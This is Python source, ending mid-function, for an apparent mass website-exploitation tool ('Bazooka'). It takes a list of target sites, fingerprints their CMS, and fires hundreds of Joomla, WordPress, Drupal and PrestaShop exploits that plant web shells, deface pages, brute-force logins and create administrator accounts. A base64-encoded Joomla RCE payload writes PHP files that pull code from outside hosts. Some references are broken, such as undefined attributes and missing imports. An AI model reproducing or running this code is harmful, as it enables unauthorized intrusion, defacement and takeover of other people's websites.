import os, re, sys, socket, binascii, time, json, random, threading
import datetime
try:
    from queue import Queue
except ImportError:
    from Queue import Queue

try:
    import requests
except ImportError:
    sys.exit()


class Bazooka(object):
    def __init__(self):
        try:
            os.mkdir('Exploited')
        except:
            pass
        try:
            os.mkdir('Login')
        except:
            pass
        self.r = '\033[31m'
        self.g = '\033[32m'
        self.y = '\033[33m'
        self.b = '\033[34m'
        self.m = '\033[35m'
        self.c = '\033[36m'
        self.w = '\033[37m'
        self.Headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.shell_code = open('Files/shcode.txt', 'rb').read().splitlines()
        self.version = '2.3.0'
        self.year = time.strftime("%y")
        self.month = time.strftime("%m")
        self.EMail = 'moetazbusiness@gmail.com'       # --> Put Your Email Address here
        self.Jce_Deface_image = 'Files/pwn.gif'
        self._shell = 'Files/shell.jpg'
        self.indeX = 'Files/index.jpg'
        self.TextindeX = 'Files/spy.txt'
        self.MailPoetZipShell = 'Files/spy.zip'
        self.ZipJd = 'Files/jdownlods.zip'
        self.pagelinesExploitShell = 'Files/settings_auto.php'
        self.jdShell = 'Files/vuln.php3.j'
        self.ShellPresta = 'Files/up.php'
        self.gravShell = 'Files/gravity.jpg'
        self.JoomRCEB6 = open('Files/base64RCE.txt', 'rb').read().splitlines()
        try:
            self.select = sys.argv[1]
        except:
            self.cls()
            self.print_logo()
            sys.exit()
        if self.select == str('bazooka'):
            self.cls()
            self.print_logo()
            self.concurrent = 90
            try:
                try:
                    self.Get_list = raw_input(self.g + '\n[!]' + self.r + ' WELCOME TO HELL ENTER LIST OF WEBSITES : ' + self.w)
                except:
                    self.Get_list = input(self.g + '\n[!]' + self.r + ' WELCOME TO HELL ENTER LIST OF WEBSITES : ' + self.w)

            except IOError:
                print(self.r + '[' + self.r + '!' + self.r + '] ' + self.r + 'Open your eyes!')
                sys.exit()
            self.q = Queue(self.concurrent * 2)
            for i in range(self.concurrent):
                self.t = threading.Thread(target=self.doWork)
                self.t.daemon = True
                self.t.start()
            try:
                for url in open(self.Get_list):
                    self.q.put(url.strip())
                self.q.join()
            except:
                pass
    def doWork(self):
        try:
            while True:
                url = self.q.get()
                if url.startswith('http://'):
                    url = url.replace('http://', '')
                elif url.startswith("https://"):
                    url = url.replace('https://', '')
                else:
                    pass
                try:
                    CheckOsc = requests.get('http://' + url + '/admin/images/cal_date_over.gif', timeout=10,
                                            headers=self.Headers)
                    CheckOsc2 = requests.get('http://' + url + '/admin/login.php', timeout=10,
                                             headers=self.Headers)
                    CheckCMS = requests.get('http://' + url + '/templates/system/css/system.css', timeout=5,
                                            headers=self.Headers)
                    Checktwo = requests.get('http://' + url, timeout=5, headers=self.Headers)
                    if 'Import project-level system CSS' in CheckCMS.text or CheckCMS.status_code == 200:
                        self.joomver(url)
                        self.createuser(url)
                        self.RCE_Joomla(url)
                        self.Com_AdsManager_Shell(url)
                        self.Com_AdsManager_Shellx(url)
                        self.alberghiExploit(url)
                        self.Com_CCkJseblod(url)
                        self.Com_CCkJseblodx(url)
                        self.Com_Fabric(url)
                        self.Com_Fabricx(url)
                        self.Com_Hdflvplayer(url)
                        self.Com_Hdflvplayerx(url)
                        self.Com_Jdownloads_shell(url)
                        self.Com_Joomanager(url)
                        self.Com_Joomanagerx(url)
                        self.Com_MyBlog(url)
                        self.Com_MyBlogx(url)
                        self.Com_Macgallery(url)
                        self.Com_Macgalleryx(url)
                        self.JCE_shell(url)
                        self.Com_s5_media_player(url)
                        self.Com_s5_media_playerx(url)
                        self.Com_Jbcatalog(url)
                        self.Com_Jbcatalogx(url)
                        self.Com_SexyContactform(url)
                        self.Com_SexyContactformx(url)
                        self.Com_rokdownloads(url)
                        self.Com_rokdownloadsx(url)
                        self.Com_extplorer(url)
                        self.Com_extplorerx(url)						
                        self.Com_jwallpapers_Shell(url)
                        self.Com_facileforms(url)
                        self.Com_facileformsx(url)
                        self.JooMLaBruteForce(url)
                        self.Jce_Test(url)
                        self.Com_Jdownloads(url)
                        self.Com_Jdownloadsx(url)
                        self.Jce_Testx(url)
                        self.comadsmanager(url)
                        self.com_simplephotogallery(url)
                        self.com_media(url)
                        self.comfabrik(url)
                        self.mod_socialpinboard_menu(url)
                        self.foxcontact(url)
                        self.com_b2jcontact(url)
                        self.com_users(url)
                        self.com_weblinks(url)
                        self.mod_simplefileupload(url)
                        self.com_redmystic(url)
                        self.com_civicrm(url)
                        self.com_acymailing(url)
                        self.com_jnewsletter(url)
                        self.com_jinc(url)
                        self.com_maianmedia(url)
                        self.com_jnews(url)
                        self.com_joomleague(url)
                        self.com_spidersql(url)
                        self.mod_dvfoldercontentcnf(url)
                        self.jw_allvideoscnf(url)
                        self.com_product_modulcnf(url)
                        self.com_cckjseblodcnf(url)
                        self.com_contushdvideosharecnf(url)
                        self.com_communitycnf(url)
                        self.com_aceftpcnf(url)
                        self.wddownloadcnf(url)
                        self.FckEditor(url)
                    elif '/wp-content/' in Checktwo.text:
                        self.membershipsimplified(url)
                        self.MacPhotoGallery(url)
                        self.jtrtresponsivetables(url)
                        self.acento(url)
                        self.ajaxstore(url)
                        self.Antioch(url)
                        self.Authentic(url)
                        self.Churchope(url)
                        self.Epic(url)
                        self.Felis(url)
                        self.Force(url)
                        self.hbaudio(url)
                        self.History(url)
                        self.Imageex(url)
                        self.kbslider(url)
                        self.Linenity(url)
                        self.Lote27(url)
                        self.Markant(url)
                        self.MichaelCanthony(url)
                        self.mTheme(url)
                        self.NativeChurch(url)
                        self.Parallelus(url)
                        self.RedSteel(url)
                        self.S3bubble(url)
                        self.TheLoft(url)
                        self.cpanel(url)
                        self.wpmver(url)
                        self.Wordpress(url)
                        self.Revslider_SHELL(url)
                        self.wysijaExploit(url)
                        self.WP_User_Frontend(url)
                        self.Gravity_Forms_Shell(url)
                        self.HD_WebPlayerSqli(url)
                        self.pagelinesExploit(url)
                        self.HeadWayThemeExploit(url)
                        self.addblockblocker(url)
                        self.cherry_plugin(url)
                        self.formcraftExploit_Shell(url)
                        self.UserProExploit(url)
                        self.wp_mobile_detector(url)
                        self.Wp_Job_Manager(url)
                        self.wp_content_injection(url)
                        self.viral_optins(url)
                        self.Woocomrece(url)
                        self.CateGory_page_icons(url)
                        self.Downloads_Manager(url)
                        self.wp_support_plus_responsive_ticket_system(url)
                        self.wp_miniaudioplayer(url)
                        self.eshop_magic(url)
                        self.ungallery(url)
                        self.barclaycart(url)
                        self.wp_gdpr_compliance(url)
                        self.Wordpressinstaller(url)
                        self.betheme(url)
                        self.woopraRCE(url)
                        self.invit0r(url)
                        self.formidable(url)
                        self.evarisk(url)
                        self.wpslimstatRCE(url)
                        self.completeGalleryManager(url)
                        self.ShoppingCart(url)
                        self.auctionPlugin(url)
                        self.area53(url)
                        self.utstrange(url)
                        self.ThisWay(url)
                        self.theagency(url)
                        self.switchblade(url)
                        self.atom(url)
                        self.purevision(url)
                        self.magnitudo(url)
                        self.cubed_v1dot2(url)
                        self.RightNow(url)
                        self.Tevolution(url)
                        self.html5avmanager(url)
                        self.dzsvideowhisper(url)
                        self.galleryversion(url)
                        self.konzept(url)
                        self.Seowatcher(url)
                        self.omnisecurefil(url)
                        self.pitchprint(url)
                        self.satoshi(url)
                        self.radialth(url)
                        self.pinboard(url)
                        self.wpstorecart(url)
                        self.armyknife(url)
                        self.assetmanager(url)
                        self.evolve(url)
                        self.acffrontenddisplay(url)
                        self.designfolioplus(url)
                        self.Learndash(url)
                        self.MarketPlace(url)
                        self.uploaderplug(url)
                        self.wpproperty(url)
                        self.socialnetwork(url)
                        self.magicfields(url)
                        self.custombackground(url)
                        self.ecstatic(url)
                        self.customtshirtdesigner(url)
                        self.qualifire(url)
                        self.boxit(url)
                        self.Ghostth(url)
                        self.Coldfusion(url)
                        self.simplecart(url)
                        self.ninetofive(url)
                        self.JsorSliders(url)
                        self.clockstone(url)
                        self.Blaze(url)
                        self.Catpro(url)
                        self.downloadsmanagr(url)
                        self.formcraft(url)
                        self.openflashchart(url)
                        self.dreamwork(url)
                        self.contactform(url)
                        self.fluid_forms(url)
                        self.levoslideshow(url)
                        self.vertical(url)
                        self.carousel(url)
                        self.superb(url)
                        self.yass(url)
                        self.homepageslideshow(url)
                        self.imagenewsslider(url)
                        self.blissnewsslider(url)
                        self.xdatatoolkit(url)
                        self.powerzoomer(url)
                        self.woocommerceproductsfilter(url)
                        self.mmformscommunity(url)
                        self.developertools(url)
                        self.genesis_simple(url)
                        self.dzs_portfolio(url)
                        self.dzs_videogallery(url)
                        self.RevsliderGetcPanel(url)
                        self.showbiz(url)
                        self.SimpleAdsManager(url)
                        self.slideshowpro(url)
                        self.InBoundio_Marketing(url)
                        self.dzs_zoomsounds(url)
                        self.Reflex_Gallery(url)
                        self.Creative_Contact_Form(url)
                        self.Realestate_tema_upload(url)
                        self.Work_The_Flow_File_Upload(url)
                        self.brainstorm(url)
                        self.php_event_calendar(url)
                        self.synoptic(url)
                        self.u_design(url)
                        self.workflow(url)
                        self.wp_shop(url)
                        self.RobotcaLFDcnf(url)
                        self.miwoftpLFDcnf(url)
                        self.ebookLFDcnf(url)
                        self.yakimabaitcnf(url)
                        self.filemanagercnf(url)
                        self.trinitycnf(url)
                        self.RedSteelcnf(url)
                        self.paralleluscnf(url)
                        self.kbslider_show(url)
                        self.view_pdfcnf(url)
                        self.advanced_uploader(url)
                        self.urbancitycnf(url)
                        self.mTheme_Unuscnf(url)
                        self.Revslider_SHELLx(url)
                        self.Revslider_Configx(url)  
                        self.Revslider_cssx(url)  
                        self.wysijaExploitx(url)
                        self.WP_User_Frontendx(url)
                        self.Gravity_Forms_Shellx(url)
                        self.HD_WebPlayerSqlix(url)
                        self.pagelinesExploitx(url)
                        self.HeadWayThemeExploitx(url)
                        self.addblockblockerx(url)
                        self.cherry_pluginx(url)
                        self.formcraftExploit_Shellx(url)
                        self.formcraftExploitIndeXx(url)
                        self.UserProExploitx(url)
                        self.wp_mobile_detectorx(url)
                        self.Wp_Job_Managerx(url)
                        self.wp_content_injectionx(url)
                        self.viral_optinsx(url)
                        self.Woocomrecex(url)
                        self.osCommercex(url)
                        self.CateGory_page_iconsx(url)
                        self.Downloads_Managerx(url)
                        self.wp_support_plus_responsive_ticket_systemx(url)
                        self.wp_miniaudioplayerx(url)
                        self.eshop_magicx(url)
                        self.ungalleryx(url)
                        self.barclaycartx(url)   
                        self.osCommerce(url)
                        self.FckEditor(url)	
                    elif '/sites/default/' in Checktwo.text \
                            or 'content="Drupal' in Checktwo.text:
                        self.Drupal_Bartik(url)
                        self.Drupal_Sqli_Addadmin(url)
                        self.DrupalGedden2(url)
                        self.DrupalBruteForce(url)
                        self.Drupal8RCERest(url)
                        self.FckEditor(url)
                    elif 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckOsc.text or 'osCommerce' in CheckOsc2.text:
                        self.osCommerce(url)
                        self.OsCommerceBF(url)
                        self.FckEditor(url)
                    elif 'prestashop' in Checktwo.text:
                        self.lib(url)
                        self.additionalproductstabs(url)
                        self.addthisplugin(url)
                        self.orderfiles(url)
                        self.wdoptionpanel(url)
                        self.pk_vertflexmenu(url)
                        self.masseditproduct(url)
                        self.blocktestimonial(url)
                        self.lokomedia(url)                
                        self.realty(url)
                        self.resaleform(url)
                        self.megaproduct(url)
                        self.filesupload(url)
                        self.columnadverts(url)
                        self.leosliderlayer(url)
                        self.vtemskitter(url)
                        self.libx(url)
                        self.psmodthemeoptionpanel(url)
                        self.psmodthemeoptionpanelx(url)
                        self.tdpsthemeoptionpanel(url)
                        self.tdpsthemeoptionpanelx(url)
                        self.megamenu(url)
                        self.megamenux(url)
                        self.nvn_export_orders(url)
                        self.nvn_export_ordersx(url)						
                        self.pk_flexmenu(url)
                        self.pk_flexmenux(url)						
                        self.wdoptionpanelx(url)
                        self.fieldvmegamenu(url)
                        self.fieldvmegamenux(url)
                        self.wg24themeadministration(url)
                        self.wg24themeadministrationx(url)
                        self.videostab(url)
                        self.videostabx(url)
                        self.cartabandonmentproOld(url)
                        self.cartabandonmentproOldx(url)
                        self.cartabandonmentpro(url)
                        self.cartabandonmentprox(url)
                        self.advancedslider(url)
                        self.advancedsliderx(url)
                        self.attributewizardpro_x(url)
                        self.attributewizardpro_xx(url)
                        self.attributewizardpro3(url)
                        self.attributewizardpro3x(url)
                        self.attributewizardpro2(url)
                        self.attributewizardpro2x(url)
                        self.attributewizardpro(url)
                        self.attributewizardprox(url)
                        self.jro_homepageadvertise(url)
                        self.jro_homepageadvertisex(url)
                        self.homepageadvertise2(url)
                        self.homepageadvertise2x(url)
                        self.homepageadvertise(url)
                        self.homepageadvertisex(url)
                        self.productpageadverts(url)
                        self.productpageadvertsx(url)
                        self.simpleslideshow(url)
                        self.vtermslideshow(url)
                        self.soopabanners(url)
                        self.soopamobile(url)
                        self.columnadverts(url)
                        self.simpleslideshowx(url)
                        self.vtermslideshowx(url)
                        self.soopabannersx(url)
                        self.soopamobilex(url)
                        self.columnadvertsx(url)
                        self.FckEditor(url)
                    elif 'catalog/view/' in Checktwo.text:
                        self.OpenCart(self.Url)
                        self.FckEditor(Url)
                    elif 'Magento' in Checktwo.text:
                        self.Magento(self.Url)
                        self.FckEditor(Url)
                    else:
                        self.Vbulletin_RCE5(url)
                        self.vehiculo_photos(url)
                        self.FilesUpp(url)
                        self.tinymce(url)
                        self.Ajaxfilemanager1(url)
                        self.Arrayfil(url)
                        self.jquery(url)
                        self.PhotoStore(url)
                        self.cfg_contactform(url)
                        self.PHP_Fusion(url)
                        self.uploadifyamazons3(url)
                        self.umapresence(url)
                        self.TikiWiki(url)
                        self.FckEditor(url)
                        
                except:
                    pass
        except:
            pass

    def print_logo(self):
        clear = "\x1b[0m"
        colors = [31]

        x = """

__      ___                   __ ____ ____ ______ 
\ \    / (_)                 /_ |___ \___ \____  |
 \ \  / / _ _ __   ___ _ __   | | __) |__) |  / / 
  \ \/ / | | '_ \ / _ \ '__|  | ||__ <|__ <  / /  
   \  /  | | |_) |  __/ |     | |___) |__) |/ /   
    \/   |_| .__/ \___|_|     |_|____/____//_/    
           | |                                    
           |_|                                    
    """
        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.05)
        now = datetime.datetime.now()	
        print('\n\033[92m                        STARTED AT: ' + str(now))
    def Print_Scanning(self, url, CMS):
        print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w + 'http://' + url + ' ' + self.g + ' [' + CMS + ']')


    def Timeout(self, url):
        print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w + 'http://' + url + ' ' + self.r + ' [ TimeOut]')

    def Print_NotVuln(self, NameVuln, site):
        print(self.g + '[' + self.g + '>' + self.g + '] '
              + self.w + 'http://' + site + ' '+ ' ' + self.g + ' [' + NameVuln + '] ' + self.r + ' [Failed]')

    def Print_Username_Password(self, username, Password):
        print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w + 'Username: ' + self.g + username)
        print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w + 'Password: ' + self.g + Password)


    def Print_Vuln(self, NameVuln, site):
        print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w + 'http://' + site + ' ' + ' ' +
              self.g + ' [' + NameVuln + '] ' + self.g + ' [Done]')

    def Print_Vuln_index(self, indexPath):
        print(self.g + '[' + self.g + '>' + self.g + '] ' + self.g + indexPath + self.g + ' [Get Index]')

    def Print_vuln_Shell(self, shellPath):
        print(self.g + '[' + self.g + '>' + self.g + '] '
              + self.w + shellPath + self.g + ' [Get Shell]')

    def Print_vuln_Config(self, pathconfig):
        print(self.g + '[' + self.g + '>' + self.g + '] '
              + self.w + pathconfig + self.g + ' [Get Config]')
    def printor(self, ch,site):
        print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w + 'http://' + site + ' ' + ' ' +
              self.g + ' [' + ch + '] ')
        with open('Path/%s.txt'%(ch),'a') as lll:
            lll.write(site+'\n')
    def AdminTakeOver(self, NameVuln, site):
        print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w + 'http://' + site + ' ' + ' ' +
              self.g + ' [' + NameVuln + '] ' + self.g + ' [Get Admin]')

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def createuser(self, site):
        try:
            form_url = self.site + \
                '/index.php/using-joomla/extensions/components/users-component/registration-form'
            action_url = self.site + \
                '/index.php/using-joomla/extensions/components/users-component/registration-form?task=registration.register'
            username = str(random.randrange(1000, 10000))
            email = username + 'moetazbusiness@gmail.com'
            password = ''.join(random.choice(
                string.ascii_uppercase + string.digits) for _ in range(8))

            user_data = {
                'name': username,
                'username': username,
                'password1': password,
                'password2': password + 'XXXinvalid',
                'email1': email,
                'email2': email,
                'groups][': '7'
            }

            session = requests.Session()
            response = session.get(form_url, verify=False)
            if response.status_code != 200:
                return
            soup = bs4.BeautifulSoup(response.text, 'lxml')
            form = soup.find('form', id='member-registration')
            data = {e['name']: e['value'] for e in form.find_all('input')}
            user_data = {'%s]' % k: v for k, v in user_data.items()}
            data.update(user_data)
            response = session.post(action_url, data=data)
            data['jform[password2]'] = data['jform[password1]']
            # del data['jform[groups][]']
            response = session.post(action_url, data=data)
            sys.stdout.write("\a[+] Account created for user: {}, password: {}, email: {}".format(username, password, email))
            with open('Exploited/createuser.txt', 'a') as joomla_admins:
                joomla_admins.write(self.site + '\n')
                joomla_admins.write('User: ' + username + '\n')
                joomla_admins.write('Pass: ' + password + '\n')
                joomla_admins.write('Email: ' + email + '\n')
        except AttributeError:
            pass

    def RCE_Joomla(self, site):
        try:
            pl = self.generate_payload(
                "base64_decode('JGNoZWNrID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuICIvdG1wL3Z1bG4yLnBocCIgOw0KJGZwPWZvcGVuKCIkY2hlY2siLCJ3KyIpOw0KZndyaXRlKCRmcCxiYXNlNjRfZGVjb2RlKCdQRDl3YUhBTkNtWjFibU4wYVc5dUlHaDBkSEJmWjJWMEtDUjFjbXdwZXcwS0NTUnBiU0E5SUdOMWNteGZhVzVwZENna2RYSnNLVHNOQ2dsamRYSnNYM05sZEc5d2RDZ2thVzBzSUVOVlVreFBVRlJmVWtWVVZWSk9WRkpCVGxOR1JWSXNJREVwT3cwS0NXTjFjbXhmYzJWMGIzQjBLQ1JwYlN3Z1ExVlNURTlRVkY5RFQwNU9SVU5VVkVsTlJVOVZWQ3dnTVRBcE93MEtDV04xY214ZmMyVjBiM0IwS0NScGJTd2dRMVZTVEU5UVZGOUdUMHhNVDFkTVQwTkJWRWxQVGl3Z01TazdEUW9KWTNWeWJGOXpaWFJ2Y0hRb0pHbHRMQ0JEVlZKTVQxQlVYMGhGUVVSRlVpd2dNQ2s3RFFvSmNtVjBkWEp1SUdOMWNteGZaWGhsWXlna2FXMHBPdzBLQ1dOMWNteGZZMnh2YzJVb0pHbHRLVHNOQ24wTkNpUmphR1ZqYXlBOUlDUmZVMFZTVmtWU1d5ZEVUME5WVFVWT1ZGOVNUMDlVSjEwZ0xpQWlMM1J0Y0M5MmRXeHVMbkJvY0NJZ093MEtKSFJsZUhRZ1BTQm9kSFJ3WDJkbGRDZ25hSFIwY0hNNkx5OXlZWGN1WjJsMGFIVmlkWE5sY21OdmJuUmxiblF1WTI5dEx6QTBlQzlKUTBjdFFYVjBiMFY0Y0d4dmFYUmxja0p2VkM5dFlYTjBaWEl2Wm1sc1pYTXZkWEF1Y0dod0p5azdEUW9rYjNCbGJpQTlJR1p2Y0dWdUtDUmphR1ZqYXl3Z0ozY25LVHNOQ21aM2NtbDBaU2drYjNCbGJpd2dKSFJsZUhRcE93MEtabU5zYjNObEtDUnZjR1Z1S1RzTkNtbG1LR1pwYkdWZlpYaHBjM1J6S0NSamFHVmpheWtwZXcwS0lDQWdJR1ZqYUc4Z0pHTm9aV05yTGlJOEwySnlQaUk3RFFwOVpXeHpaU0FOQ2lBZ1pXTm9ieUFpYm05MElHVjRhWFJ6SWpzTkNtVmphRzhnSW1SdmJtVWdMbHh1SUNJZ093MEtKR05vWldOck1pQTlJQ1JmVTBWU1ZrVlNXeWRFVDBOVlRVVk9WRjlTVDA5VUoxMGdMaUFpTDJsdFlXZGxjeTkyZFd4dUxuQm9jQ0lnT3cwS0pIUmxlSFF5SUQwZ2FIUjBjRjluWlhRb0oyaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM4d05IZ3ZTVU5ITFVGMWRHOUZlSEJzYjJsMFpYSkNiMVF2YldGemRHVnlMMlpwYkdWekwzVndMbkJvY0NjcE93MEtKRzl3Wlc0eUlEMGdabTl3Wlc0b0pHTm9aV05yTWl3Z0ozY25LVHNOQ21aM2NtbDBaU2drYjNCbGJqSXNJQ1IwWlhoME1pazdEUXBtWTJ4dmMyVW9KRzl3Wlc0eUtUc05DbWxtS0dacGJHVmZaWGhwYzNSektDUmphR1ZqYXpJcEtYc05DaUFnSUNCbFkyaHZJQ1JqYUdWamF6SXVJand2WW5JK0lqc05DbjFsYkhObElBMEtJQ0JsWTJodklDSnViM1FnWlhocGRITXlJanNOQ21WamFHOGdJbVJ2Ym1VeUlDNWNiaUFpSURzTkNnMEtKR05vWldOck16MGtYMU5GVWxaRlVsc25SRTlEVlUxRlRsUmZVazlQVkNkZElDNGdJaTkyZFd4dUxtaDBiU0lnT3cwS0pIUmxlSFF6SUQwZ2FIUjBjRjluWlhRb0oyaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRMM0poZHk4NE9EQjFabUZYUmljcE93MEtKRzl3TXoxbWIzQmxiaWdrWTJobFkyc3pMQ0FuZHljcE93MEtabmR5YVhSbEtDUnZjRE1zSkhSbGVIUXpLVHNOQ21aamJHOXpaU2drYjNBektUc05DZzBLRFFva1kyaGxZMnMyUFNSZlUwVlNWa1ZTV3lkRVQwTlZUVVZPVkY5U1QwOVVKMTBnTGlBaUwybHRZV2RsY3k5MmRXeHVMbWgwYlNJZ093MEtKSFJsZUhRMklEMGdhSFIwY0Y5blpYUW9KMmgwZEhCek9pOHZjR0Z6ZEdWaWFXNHVZMjl0TDNKaGR5ODRPREIxWm1GWFJpY3BPdzBLSkc5d05qMW1iM0JsYmlna1kyaGxZMnMyTENBbmR5Y3BPdzBLWm5keWFYUmxLQ1J2Y0RZc0pIUmxlSFEyS1RzTkNtWmpiRzl6WlNna2IzQTJLVHNOQ2o4KycpKTsNCmZjbG9zZSgkZnApOw0KJGNoZWNrMiA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiAiL2ltYWdlcy92dWxuMi5waHAiIDsNCiRmcDI9Zm9wZW4oIiRjaGVjazIiLCJ3KyIpOw0KZndyaXRlKCRmcDIsYmFzZTY0X2RlY29kZSgnUEQ5d2FIQU5DbVoxYm1OMGFXOXVJR2gwZEhCZloyVjBLQ1IxY213cGV3MEtDU1JwYlNBOUlHTjFjbXhmYVc1cGRDZ2tkWEpzS1RzTkNnbGpkWEpzWDNObGRHOXdkQ2drYVcwc0lFTlZVa3hQVUZSZlVrVlVWVkpPVkZKQlRsTkdSVklzSURFcE93MEtDV04xY214ZmMyVjBiM0IwS0NScGJTd2dRMVZTVEU5UVZGOURUMDVPUlVOVVZFbE5SVTlWVkN3Z01UQXBPdzBLQ1dOMWNteGZjMlYwYjNCMEtDUnBiU3dnUTFWU1RFOVFWRjlHVDB4TVQxZE1UME5CVkVsUFRpd2dNU2s3RFFvSlkzVnliRjl6WlhSdmNIUW9KR2x0TENCRFZWSk1UMUJVWDBoRlFVUkZVaXdnTUNrN0RRb0pjbVYwZFhKdUlHTjFjbXhmWlhobFl5Z2thVzBwT3cwS0NXTjFjbXhmWTJ4dmMyVW9KR2x0S1RzTkNuME5DaVJqYUdWamF5QTlJQ1JmVTBWU1ZrVlNXeWRFVDBOVlRVVk9WRjlTVDA5VUoxMGdMaUFpTDNSdGNDOTJkV3h1TG5Cb2NDSWdPdzBLSkhSbGVIUWdQU0JvZEhSd1gyZGxkQ2duYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMekEwZUM5SlEwY3RRWFYwYjBWNGNHeHZhWFJsY2tKdlZDOXRZWE4wWlhJdlptbHNaWE12ZFhBdWNHaHdKeWs3RFFva2IzQmxiaUE5SUdadmNHVnVLQ1JqYUdWamF5d2dKM2NuS1RzTkNtWjNjbWwwWlNna2IzQmxiaXdnSkhSbGVIUXBPdzBLWm1Oc2IzTmxLQ1J2Y0dWdUtUc05DbWxtS0dacGJHVmZaWGhwYzNSektDUmphR1ZqYXlrcGV3MEtJQ0FnSUdWamFHOGdKR05vWldOckxpSThMMkp5UGlJN0RRcDlaV3h6WlNBTkNpQWdaV05vYnlBaWJtOTBJR1Y0YVhSeklqc05DbVZqYUc4Z0ltUnZibVVnTGx4dUlDSWdPdzBLSkdOb1pXTnJNaUE5SUNSZlUwVlNWa1ZTV3lkRVQwTlZUVVZPVkY5U1QwOVVKMTBnTGlBaUwybHRZV2RsY3k5MmRXeHVMbkJvY0NJZ093MEtKSFJsZUhReUlEMGdhSFIwY0Y5blpYUW9KMmgwZEhCek9pOHZjbUYzTG1kcGRHaDFZblZ6WlhKamIyNTBaVzUwTG1OdmJTOHdOSGd2U1VOSExVRjFkRzlGZUhCc2IybDBaWEpDYjFRdmJXRnpkR1Z5TDJacGJHVnpMM1Z3TG5Cb2NDY3BPdzBLSkc5d1pXNHlJRDBnWm05d1pXNG9KR05vWldOck1pd2dKM2NuS1RzTkNtWjNjbWwwWlNna2IzQmxiaklzSUNSMFpYaDBNaWs3RFFwbVkyeHZjMlVvSkc5d1pXNHlLVHNOQ21sbUtHWnBiR1ZmWlhocGMzUnpLQ1JqYUdWamF6SXBLWHNOQ2lBZ0lDQmxZMmh2SUNSamFHVmphekl1SWp3dlluSStJanNOQ24xbGJITmxJQTBLSUNCbFkyaHZJQ0p1YjNRZ1pYaHBkSE15SWpzTkNtVmphRzhnSW1SdmJtVXlJQzVjYmlBaUlEc05DZzBLSkdOb1pXTnJNejBrWDFORlVsWkZVbHNuUkU5RFZVMUZUbFJmVWs5UFZDZGRJQzRnSWk5MmRXeHVMbWgwYlNJZ093MEtKSFJsZUhReklEMGdhSFIwY0Y5blpYUW9KMmgwZEhCek9pOHZjR0Z6ZEdWaWFXNHVZMjl0TDNKaGR5ODRPREIxWm1GWFJpY3BPdzBLSkc5d016MW1iM0JsYmlna1kyaGxZMnN6TENBbmR5Y3BPdzBLWm5keWFYUmxLQ1J2Y0RNc0pIUmxlSFF6S1RzTkNtWmpiRzl6WlNna2IzQXpLVHNOQ2cwS0RRb2tZMmhsWTJzMlBTUmZVMFZTVmtWU1d5ZEVUME5WVFVWT1ZGOVNUMDlVSjEwZ0xpQWlMMmx0WVdkbGN5OTJkV3h1TG1oMGJTSWdPdzBLSkhSbGVIUTJJRDBnYUhSMGNGOW5aWFFvSjJoMGRIQnpPaTh2Y0dGemRHVmlhVzR1WTI5dEwzSmhkeTg0T0RCMVptRlhSaWNwT3cwS0pHOXdOajFtYjNCbGJpZ2tZMmhsWTJzMkxDQW5keWNwT3cwS1puZHlhWFJsS0NSdmNEWXNKSFJsZUhRMktUc05DbVpqYkc5elpTZ2tiM0EyS1RzTkNqOCsnKSk7DQpmY2xvc2UoJGZwMik7DQo=')")
            headers = {
                'User-Agent': pl
            }
            try:
                cookies = requests.get('http://' + site, headers=headers, timeout=5).cookies
            except:
                cookies = []
            try:
                rr = requests.get('http://' + site + '/', headers=headers, cookies=cookies, timeout=5)
                if rr:
                    requests.get('http://' + site + '/images/vuln2.php', timeout=5, headers=self.Headers)
                    requests.get('http://' + site + '/tmp/vuln2.php', timeout=5, headers=self.Headers)
                    ShellCheck = requests.get('http://' + site + '/images/vuln.php', timeout=5, headers=self.Headers)
                    ShellCheck2 = requests.get('http://' + site + '/tmp/vuln.php', timeout=5, headers=self.Headers)
                    if 'Vuln!!' in ShellCheck.text:
                        self.Print_vuln_Shell(site + '/images/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write('http://' + site + '/images/vuln.php' + '\n')
                        IndexCheck = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                        IndexCheck2 = requests.get('http://' + site + '/images/vuln.htm', timeout=5,
                                                   headers=self.Headers)
                        if 'Vuln!!' in IndexCheck.text:
                            self.Print_Vuln_index(site + '/vuln.htm')
                            with open('Exploited/Index.txt', 'a') as writer:
                                writer.write('http://' + site + '/vuln.htm' + '\n')
                        elif 'Vuln!!' in IndexCheck2.text:
                            self.Print_Vuln_index(site + '/images/vuln.htm')
                            with open('Exploited/Index.txt', 'a') as writer:
                                writer.write('http://' + site + '/images/vuln.htm' + '\n')
                    elif 'Vuln!!' in ShellCheck2.text:
                        self.Print_vuln_Shell(site + '/tmp/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write('http://' + site + '/tmp/vuln.php' + '\n')
                        IndexCheck = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                        IndexCheck2 = requests.get('http://' + site + '/images/vuln.htm', timeout=5,
                                                   headers=self.Headers)
                        if 'Vuln!!' in IndexCheck.text:
                            self.Print_Vuln_index(site + '/vuln.htm')
                            with open('Exploited/Index.txt', 'a') as writer:
                                writer.write('http://' + site + '/vuln.htm' + '\n')
